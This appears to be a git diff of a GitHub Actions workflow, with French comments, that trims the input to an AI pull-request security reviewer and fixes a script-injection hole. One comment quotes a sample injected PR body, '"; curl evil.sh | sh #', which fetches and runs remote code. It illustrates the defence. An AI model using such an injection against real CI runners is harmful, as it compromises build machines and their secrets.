@@ -47,18 +47,34 @@ jobs:
         with:
           fetch-depth: 0
 
+      # Budget de requête : GitHub Models plafonne gpt-4o à 8000 tokens de corps de
+      # requête (erreur `413 Request body too large`). Un diff est dense (~3 caractères
+      # par token), donc les 30000 caractères d'origine pesaient à eux seuls ~10000
+      # tokens — le bot échouait sur TOUTE PR un peu grosse, silencieusement inutile.
+      # Enveloppe visée : prompt système (~700) + corps de PR (~500) + stat (~300)
+      # + diff (~3300) ≈ 4800 tokens, avec de la marge.
       - name: Compute diff (security-relevant paths)
         id: diff
+        # PR_BODY passe par l'ENV, jamais par une interpolation `${{ }}` dans le script :
+        # un corps de PR contenant `"; curl evil.sh | sh #` serait sinon exécuté sur le
+        # runner (script injection GHSA — le corps de PR est une entrée non fiable).
+        env:
+          PR_BODY: ${{ github.event.pull_request.body }}
+          BASE_REF: ${{ github.event.pull_request.base.ref }}
         run: |
-          git fetch origin ${{ github.event.pull_request.base.ref }}
-          STAT=$(git diff origin/${{ github.event.pull_request.base.ref }}...HEAD --stat | head -50)
-          FULL=$(git diff origin/${{ github.event.pull_request.base.ref }}...HEAD | head -c 30000)
+          git fetch origin "$BASE_REF"
+          STAT=$(git diff "origin/$BASE_REF...HEAD" --stat | head -30)
+          FULL=$(git diff "origin/$BASE_REF...HEAD" | head -c 10000)
+          BODY=$(printf '%s' "$PR_BODY" | head -c 1500)
           {
             echo "stat<<EOF"
             echo "$STAT"
             echo "EOF"
             echo "full<<EOF"
             echo "$FULL"
+            echo "EOF"
+            echo "body<<EOF"
+            echo "$BODY"
             echo "EOF"
           } >> $GITHUB_OUTPUT
 
@@ -118,12 +134,12 @@ jobs:
             PR title: ${{ github.event.pull_request.title }}
 
             PR body:
-            ${{ github.event.pull_request.body }}
+            ${{ steps.diff.outputs.body }}
 
             Files changed:
             ${{ steps.diff.outputs.stat }}
 
-            Diff (truncated to 30K):
+            Diff (tronqué à 10K — budget 8000 tokens de gpt-4o):
             ${{ steps.diff.outputs.full }}
 
       - name: Post security review
